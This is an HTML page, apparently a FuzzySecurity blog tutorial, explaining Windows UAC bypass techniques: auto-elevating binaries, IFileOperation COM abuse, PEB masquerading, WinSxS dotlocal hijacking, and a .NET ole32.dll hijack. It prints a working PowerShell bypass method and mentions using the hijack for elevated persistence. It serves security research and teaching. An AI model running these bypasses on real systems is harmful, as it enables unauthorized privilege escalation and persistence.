@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | Anatomy of UAC Attacks</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../css/icons.css">  
+  
+  <!-- SyntaxHighlighter -->
+  <link type="text/css" rel="stylesheet" href="../css/shCoreEmacs.css"/>
+  
+    <!-- SyntaxHighlighter -->
+	<script type="text/javascript" src="../js/shCore.js"></script>
+	<script type="text/javascript" src="../js/shBrushPowerShell.js"></script>
+	<script type="text/javascript" src="../js/shBrushCSharp.js"></script>
+    <script type="text/javascript">SyntaxHighlighter.all();</script>
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../images/logo.png" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../index.html">Home</a>
+            </li>
+            <li><a href="../tutorials.html" class="active">Tutorials</a>
+            </li>
+            <li><a href="../coding.html">Scripting</a>
+            </li>
+            <li><a href="../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../links.html">Links</a>
+            </li>
+            <li><a href="../patreon.html">Patreon</a></li><li><a href="../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../tutorials.html">Tutorials</a> <b>&#187;</b></li>
+          <li>Anatomy of UAC Attacks</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="eighteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Anatomy of UAC Attacks<span class="line"></span></h2>
+
+      <div class="fourteen columns bottom">
+      <p>Hola, in this post we will look at the basic principals involved in UAC (User Account Control) bypass attacks. I will not go into to much detail on what Microsoft says UAC is or is not except here in the introduction.<br /><br />
+
+UAC, introduced with Windows Vista, enables Admin users to operate their Windows machine with standard user rights as opposed to Administrative rights. By default the initial user account on Windows is part of the Administrator group, this is simply a requirement. Because of this, back in the day (pre Vista era), developers had a tendency to assume users had local admin rights and often developed their applications carelessly to require elevated privileges. The official line is that UAC was introduced as a way to curb this behavior and to provide backwards compatibility.<br /><br />
+
+Be that as it may, a direct benefit of UAC is that it protects Admin users from, or alerts them to, malicious, elevated, actions performed by software components. Microsoft would not agree, but I think UAC is actually a very proficient security mechanism (if we forget about the prevalent dll side-loading issues!). Anyone who wants to argue this only needs to look at some advanced malware kit’s or exploitation frameworks such as Metasploit/Cobalt Strike, all of which include mechanisms to bypass UAC. Also, let’s not forget that Microsoft has patched a whole bunch of bypasses, eg using WUSA to extract CAB files to a specific path. It is a shame really that a solid side-loading fix can’t be implemented as doing so would greatly increase end-user safety.<br /><br />
+
+Anyway, UAC always sparks vigorous debate, so I won’t say any more on the subject. Let’s poke some holes is this “compatibility” feature!<br /><br />
+      
+      <span style="color: #ffffff;"><strong>Resources:</strong></span><br />
+      + Bypass-UAC (<a href="https://twitter.com/fuzzysec">@FuzzySec</a>) - <a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC">here</a><br />
+      + UACME (<a href="https://twitter.com/hfiref0x">@hFireF0X</a>) - <a href="https://github.com/hfiref0x/UACME">here</a><br />
+      + Bypassing Windows User Account Control (UAC) and ways of mitigation (<a href="https://twitter.com/ParvezGHH">@ParvezGHH</a>) - <a href="https://www.greyhathacker.net/?p=796">here</a><br />
+      + “Fileless” UAC Bypass Using eventvwr.exe and Registry Hijacking (<a href="https://twitter.com/enigma0x3">@enigma0x3</a>) - <a href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/">here</a><br />
+      + Bypassing UAC on Windows 10 using Disk Cleanup (<a href="https://twitter.com/enigma0x3">@enigma0x3</a>) - <a href="https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/">here</a><br />
+      + Bypassing User Account Control (UAC) using TpmInit (<a href="https://twitter.com/Cneelis">@Cneelis</a>) - <a href="http://uacmeltdown.blogspot.be/2016/08/bypassing-user-account-control-uac.html">here</a><br />
+      + Inside Windows 7 User Account Control (Microsoft Technet) - <a href="https://technet.microsoft.com/en-us/magazine/2009.07.uac.aspx">here</a><br />
+      + Inside Windows Vista User Account Control (Microsoft Technet) - <a href="https://technet.microsoft.com/en-us/magazine/2007.06.uac.aspx">here</a><br />
+      + User Account Control (MSDN) - <a href="https://blogs.msdn.microsoft.com/e7/2008/10/08/user-account-control/">here</a></p><br />
+
+<h2 class="title">Auto-Elevation<span class="line"></span></h2>
+
+<p>The main thing to understand is that process tokens created by Admin user’s are stripped of certain privileges when that process is launched normally as opposed to with elevated privileges (eg: Run as Administrator..). We can easily verify this by dumping token privileges using <a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-TokenPrivs.ps1">Get-TokenPrivs</a> or with Sysinternals process explorer. The screenshot below shows two instances of “cmd.exe”, one launched normally and one launched as Administrator.</p>
+
+<p>&nbsp;</p><img src="images/UAC_1.png"><p>&nbsp;</p>
+
+<p>Essentially, users belonging to the Administrator group manage their machine with the same privileges as other users. So what is the difference really between high and low priv users? Not very much when it comes down to it, elevated action still require this token change and, depending on the UAC setting, may notify the user/ask for a password.<br /><br />
+
+Crucially though, on the middle two UAC settings, one of which is the default, a number of Windows programs will auto-elevate if the user belongs to the Administrator group. These binaries can be identified by dumping their manifest as shown below.</p>
+
+<p>&nbsp;</p><img src="images/UAC_2.png"><p>&nbsp;</p>
+
+<p>An easy way to find these binaries is to recursively dump strings and search for “autoElevate>true”. The logic here is that these binaries are signed by Microsoft; given their provenance and that the user is an Administrator, there is no need to prompt in order to elevate (in other words it’s a usability feature).<br /><br />
+
+This seems reasonable until you open <a href="https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx">process monitor</a> and find out just how bad binaries are at successfully loading resources they need (not only dll’s but also registry keys). Unfortunately this provides a malicious user with ample hijacking opportunities.<br /><br />
+
+The example below shows a well know case where MMC is used to elevate RSOP, RSOP in turn tries to load “wbemcomn.dll” with high integrity (= as Administrator).</p>
+
+<p>&nbsp;</p><img src="images/UAC_3.png"><p>&nbsp;</p>
+
+<p>The ridiculous thing is that, looking at the filtered output, there are at least three other UAC “0days” here (..sigh). If anyone wants to submit a pull request to <a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC">Bypass-UAC</a>, knock yourself out!</p>
+
+<h2 class="title">Elevated File Operations<span class="line"></span></h2>
+<p>You may be thinking, “b33f has lost his marbles, these dll’s are in a secure directory”! Just like the binaries we discussed above, there are also auto-elevating COM objects (elevated COM operations deserve their own post really). One of these COM objects is of particular use to us, <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/bb775771(v=vs.85).aspx">IFileOperation</a>. This COM object contains a lot of useful methods such as copy/move/rename/delete for filesystem objects (files and folders).<br /><br />
+
+Traditionally, the attacker writes a dll which instantiates the IFileOperation COM object and executes a method which moves the attackers file(s) to the protected directory (eg: C:\Windows\System32\wbem\wbemcomn.dll as in the example above). To get the COM object to auto-elevate the dll is injected into a medium integrity process running in a trusted directory, commonly “explorer.exe” (-> fdwReason == DLL_PROCESS_ATTACH). Sample dll source can be found in <a href="https://twitter.com/ParvezGHH">@ParvezGHH</a> post <a href="https://www.greyhathacker.net/?p=796">here</a>.<br /><br />
+
+As it turns out, however, there is a more flexible way to wield IFileOperation methods that won’t trigger alarm bells by injecting dll’s all over the place. COM objects rely on the Process Status API (<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684884(v=vs.85).aspx">PSAPI</a>) to identify which process they are running in. The funny thing is that the PSAPI parses the process PEB to get this information but an attacker can get a handle to their own process and overwrite the PEB to fool the PSAPI and as a result any COM objects instantiated from the spoofed PID (= mind blown)!<br /><br />
+
+I wrote a PowerShell POC, <a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Masquerade-PEB.ps1">Masquerade-PEB</a>, to illustrate this. In the example below PowerShell is masqueraded as explorer and Sysinternals process explorer is evidently also fooled..</p>
+
+<p>&nbsp;</p><img src="images/UAC_4.png"><p>&nbsp;</p>
+
+<h2 class="title">Case Study: WinSxS, UAC 0day all day<span class="line"></span></h2>
+<p>The default UAC setting is really nothing more than a placebo, thanks <a href="https://twitter.com/hfiref0x">@hFireF0X</a> for making me cynical! For our first case study we will have a look at the Windows Side-By-Side (<a href="https://en.wikipedia.org/wiki/Side-by-side_assembly">WinSxS</a>) dll loading issue.. WinSxS was introduced in Windows ME as a solution to the so called “dll hell” issue. Basically it is similar to a global assembly cache, when a binary needs access to a specific library it can reference the version of that library in it’s manifest and the OS will then proceed to load the relevant dll from the WinSxS folder (C:\Windows\WinSxS).<br /><br />
+
+For our case study, we will have a look at the auto-elevating Microsoft Remote Assistance binary (C:\Windows\System32\msra.exe). Below we can see the binary’s manifest.</p>
+
+<p>&nbsp;</p><img src="images/UAC_5.png"><p>&nbsp;</p>
+
+<p>Notice the dependency section, msra needs some version of the “Microsoft.Windows.Common-Controls” library. Let’s see what happens in process monitor when we execute msra.</p>
+
+<p>&nbsp;</p><img src="images/UAC_6.png"><p>&nbsp;</p>
+
+<p>At some point msra looks for a directory called “msra.exe.Local”, when it does not find that folder it accesses “C:\Windows\WinSxS” and loads the library specified in it’s manifest. The dotlocal folder can be used, legitimately, by a developer for debugging purposes (frowning face..). Can you guess what happens when we create the following directory structure.</p><br /><br />
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#990066;"><strong># We can do this using elevated IFileOperation COM object methods</strong></span>
+
+C:\Windows\System32\
+  |__> msra.exe.Local
+      |___> x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.10586.494_none_ea85e725b9ba5a4b</pre>
+<br />
+</div><br />
+
+<p>&nbsp;</p><img src="images/UAC_7.png"><p>&nbsp;</p>
+
+<p>So much *facepalm*, all we need to do to bypass UAC at this point is use the IFileOperation COM object to create that folder with a payload dll and execute msra from the command line. This is slightly oversimplified because the payload dll will likely have to forward some dll exports but you get the idea. If anyone wants to submit a pull request to <a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC">Bypass-UAC</a>, knock yourself out!<br /><br />
+
+The reason I picked WinSxS as a case study is that you will literally see this issue everywhere when you start to look at auto-elevating binaries. I highly recommend that you read <a href="http://www.kernelmode.info/forum/viewtopic.php?f=11&t=3643&start=110">this</a> thread KernelMode.</p>
+
+<h2 class="title">Case Study: Hijacking Ole32.dll with .NET => Bypass-UAC<span class="line"></span></h2>
+<p>Since there are a lot of moving parts to this type of UAC bypass (using elevated COM) I created a PowerShell framework to take care of all the heavy lifting. <a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC">Bypass-UAC</a> has a few different components: (1) Masquerade-PEB which takes care of the process spoofing, (2) Invoke-IFileOperation which exposes the IFileOperation COM object methods to PowerShell and (3) Emit-Yamabiko which drops a payload dll to disk.<br /><br />
+
+For the last case study I looked for a relatively simple UAC “0day”, I wanted something that didn’t require me to update Yamabiko and that would work on x32/x64 Win7-Win10. In the end I settled on abusing the load behavior of the .NET framework. There are lot’s of ways to trigger the erroneous loading behavior but to bypass UAC we will be using MMC (any *.msc will do).<br /><br />
+
+<span style="color: #ffffff;"><strong>Profiling MMC:</strong></span><br />
+Let’s see what happens in process monitor when we launch “mmc gpedit.msc” (filtered on: Command line has “mmc”, name name not found and path has “dll”). The screenshots below show the results on Win 7 and Win 10 respectively.</p><p>&nbsp;</p>
+
+<span style="color: #ffffff;"><strong>Win7</strong></span>
+<p>&nbsp;</p><img src="images/UAC_8.png"><p>&nbsp;</p>
+
+<span style="color: #ffffff;"><strong>Win10</strong></span>
+<p>&nbsp;</p><img src="images/UAC_9.png"><p>&nbsp;</p>
+
+<p>Yikes, both OS versions have some scary entries! However, disregarding the oddballs and those entries that don’t overlap, we are left with “MFC42LOC.DLL” and “ole32.dll”. MFC42LOC needs some further investigation, I’ve seen it a few times but it doesn’t seem to play nice. Ole32 on the other hand proved to be a suitable candidate.<br /><br />
+
+<span style="color: #ffffff;"><strong>Hijacking Ole32:</strong></span><br />
+One issue we will need to tackle is that the dll is obviously loaded from a different directory, a brief investigation reveals that it looks for ole32 in the default .NET version folder. We can get that version using the following PowerShell command.</p><br /><br />
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#990066;"><strong># Win 7</strong></span>
+PS C:\> [System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion
+v2.0.50727
+
+<span style="color:#990066;"><strong># Win 10</strong></span>
+PS C:\> [System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion
+v4.0.30319</pre>
+<br />
+</div><br />
+
+<p>&nbsp;</p>
+<p>The other, non-apparent, issue is that the <a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Bypass-UAC/Yamabiko/Yamabiko/dllmain.c">Yamabiko proxy dll</a> in Bypass-UAC opens PowerShell but PowerShell itself triggers this erroneous loading bug resulting in infinite (elevated) shells popping... To avoid this behavior we have to detect that our payload dll was loaded and then remove it so it only executes once!<br /><br />
+
+<span style="color: #ffffff;"><strong>Bypass-UAC Implementation:</strong></span><br />
+Adding methods to Bypass-UAC is really easy, if you want to know more please check out the project on <a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC">GitHub</a>! To get our bypass working I added the following method, this should hopefully be more or less self-explanatory. Don’t hesitate to leave a comment if you have any questions!</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: ps;gutter:false;auto-links: false;;">
+'UacMethodNetOle32'
+{
+    # Hybrid MMC method: mmc some.msc -> Microsoft.NET\Framework[64]\..\ole32.dll
+    # Works on x64/x32 Win7-Win10 (unpatched)
+    if ($OSMajorMinor -lt 6.1) {
+        echo "[!] Your OS does not support this method!`n"
+        Return
+    }
+
+    # Impersonate explorer.exe
+    echo "`n[!] Impersonating explorer.exe!"
+    Masquerade-PEB -BinPath "C:\Windows\explorer.exe"
+
+    if ($DllPath) {
+        echo "[>] Using custom proxy dll.."
+        echo "[+] Dll path: $DllPath"
+    } else {
+        # Write Yamabiko.dll to disk
+        echo "[>] Dropping proxy dll.."
+        Emit-Yamabiko
+    }
+
+    # Get default .NET version
+    [String]$Net_Version = [System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion
+
+    # Get count of PowerShell processes
+    $PS_InitCount = @(Get-Process -Name powershell).Count
+
+    # Expose IFileOperation COM object
+    Invoke-IFileOperation
+
+    # Exploit logic
+    echo "[>] Performing elevated IFileOperation::MoveItem operation.."
+    # x32/x64 .NET folder
+    if ($x64) {
+        $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\Microsoft.NET\Framework64\' + $Net_Version + '\'), "ole32.dll")
+    } else {
+        $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\Microsoft.NET\Framework\' + $Net_Version + '\'), "ole32.dll")
+    }
+    $IFileOperation.PerformOperations()
+
+    echo "`n[?] Executing mmc.."
+    IEX $($env:SystemRoot + '\System32\mmc.exe gpedit.msc')
+
+    # Move Yamabiko back to %tmp% after it loads to avoid infinite shells!
+    while ($true) {
+        $PS_Count = @(Get-Process -Name powershell).Count
+        if ($PS_Count -gt $PS_InitCount) {
+            try {
+                # x32/x64 .NET foler
+                if ($x64) {
+                    $IFileOperation.MoveItem($($env:SystemRoot + '\Microsoft.NET\Framework64\' + $Net_Version + '\ole32.dll'), $($env:Temp + '\'), 'ole32.dll')
+                } else {
+                    $IFileOperation.MoveItem($($env:SystemRoot + '\Microsoft.NET\Framework\' + $Net_Version + '\ole32.dll'), $($env:Temp + '\'), 'ole32.dll')
+                }
+                $IFileOperation.PerformOperations()
+                break
+            } catch {
+                # Sometimes IFileOperation throws an exception
+                # when executed twice in a row, just rerun..
+            }
+        }
+    }
+    
+    # Clean-up
+    echo "[!] UAC artifact: $($env:Temp + '\ole32.dll')`n"
+}</pre>
+</div>
+
+<p>Case closed, we have a novel UAC bypass that works everywhere! The screenshots below demonstrate the bypass on Windows 8 (x64) and Windows 10 (x32).</p>
+
+<p>&nbsp;</p>
+
+<span style="color: #ffffff;"><strong>Win8 x64</strong></span>
+<p>&nbsp;</p><img src="images/UAC_10.png"><p>&nbsp;</p>
+
+<span style="color: #ffffff;"><strong>Win10 x32</strong></span>
+<p>&nbsp;</p><img src="images/UAC_11.png"><p>&nbsp;</p>
+
+<p>On a side note, this is a pretty good persistence mechanism with elevated access. Drop a wrapper dll for ole32 in the .NET framework folder and schedule anything that uses .NET to run on startup/idle (eg: PowerShell).</p>
+
+<h2 class="title">Final Thoughts<span class="line"></span></h2>
+<p>If you made it this far, I think you can see why Microsoft doesn’t acknowledge UAC bypasses (aside from the standard “It’s not a security feature” line).. Honestly, I think the best way to get UAC on track is to aggressively patch mechanisms that allow the attacker to perform elevated copy operations (just like they did with WUSA) and leave the dll side-loading issues as they are.<br /><br />
+
+Before you go, make sure to check out <a href="https://twitter.com/enigma0x3">@enigma0x3</a> post on a fileless UAC bypass using event viewer <a href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/">here</a>, obviously a situation where you don’t need to drop anything to disk is always preferable!</p>
+
+</div>
+    </div>
+</div>
+      
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../index.html">Home</a> |
+          <a href="../tutorials.html">Tutorials</a> |
+          <a href="../coding.html">Scripting</a> |
+          <a href="../exploits.html">Exploits</a> |
+          <a href="../links.html">Links</a> |
+          <a href="../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
